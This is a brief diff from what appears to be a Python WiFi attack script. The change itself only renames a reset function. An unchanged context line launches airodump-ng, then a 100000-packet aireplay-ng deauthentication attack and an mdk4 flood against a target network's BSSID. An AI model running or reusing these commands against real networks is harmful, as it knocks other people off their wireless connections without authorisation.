@@ -80,7 +80,7 @@ while True:
                             os.system(f"xterm -bg black -fg red -geometry 120x30-0-0 -T airodump -e airodump-ng {interface} & xterm -bg black -fg blue -geometry 120x30+0+0 -T aireplay -e aireplay-ng --deauth 100000 -a {network.bssid} {interface} & xterm -bg black -fg white -geometry 120x30-0+0 -T mdk4 -e mdk4 {interface} a -a {network.bssid} -m")
                         else:
                             send()
-                            reset()
+                            reset_win()
                             time.sleep(5)
 
 
